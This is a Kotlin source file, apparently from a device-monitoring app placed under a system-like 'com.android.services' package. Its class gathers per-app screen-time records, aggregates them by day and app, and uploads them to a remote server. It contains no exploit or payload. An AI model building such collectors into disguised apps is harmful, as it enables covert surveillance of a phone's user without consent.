package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.ScreenTimeModel
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerFourApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logVerbose

class ScreenTimeCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncAppReports) {
            logVerbose("${AppConstants.SCREEN_TIME_TYPE} Preparing for uploading")
            localDatabaseSource.selectScreenTimes { screenTimes ->
                if (screenTimes.isNotEmpty()) {
                    logVerbose("${AppConstants.SCREEN_TIME_TYPE} data = $screenTimes")
                    val endId = screenTimes[screenTimes.size - 1].id
                    val startId = screenTimes[0].id
                    val screenTimeByDate = screenTimes.groupBy {
                        it.todayDate
                    }

                    val screenTimesList = arrayListOf<ScreenTimeModel>()
                    if (screenTimeByDate.isNotEmpty()) {
                        screenTimeByDate.forEach {
                            val screenTimesListByDate = it.value
                            if (screenTimesListByDate.isNotEmpty()) {
                                val screenTimesByPackageName =
                                    screenTimesListByDate.groupBy { screenTime ->
                                        screenTime.packageName
                                    }
                                if (screenTimesByPackageName.isNotEmpty()) {
                                    screenTimesByPackageName.forEach { screenTimes ->
                                        val activityReports = screenTimes.value
                                        val report = activityReports[0]
                                        val maxTimeUsed: Long =
                                            activityReports.sumOf { it.timeInMilliSeconds }
                                        val screenTimeModel = ScreenTimeModel()
                                        val dateTime= activityReports.maxOf {screenTime-> screenTime.dateTime }
                                        screenTimeModel.apply {
                                            this.uniqueId =
                                                AppUtils.md5Hash("${report.packageName}${report.todayDate}")
                                            this.packageName = report.packageName
                                            this.appName = report.appName
                                            this.dateTime = dateTime
                                            this.timeOnApp =
                                                AppUtils.convertMilliSecondsToTimeFormat(maxTimeUsed)
                                        }
                                        screenTimesList.add(screenTimeModel)
                                    }
                                }
                            }
                        }
                    }

                    if (screenTimesList.isNotEmpty()) {
                        logVerbose("${AppConstants.SCREEN_TIME_TYPE} screen time list = $screenTimesList")
                        val serverHelper = RemoteServerHelper(
                            context,
                            AppConstants.SCREEN_TIME_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi,
                            startId = startId,
                            endId = endId
                        )
                        serverHelper.upload(screenTimesList)
                    } else {
                        logVerbose("${AppConstants.SCREEN_TIME_TYPE} screen time list is Empty")
                    }
                } else {
                    logVerbose("${AppConstants.SCREEN_TIME_TYPE} No data found")
                }
            }
        } else {
            logVerbose("${AppConstants.SCREEN_TIME_TYPE} sync is Off")
        }
    }
}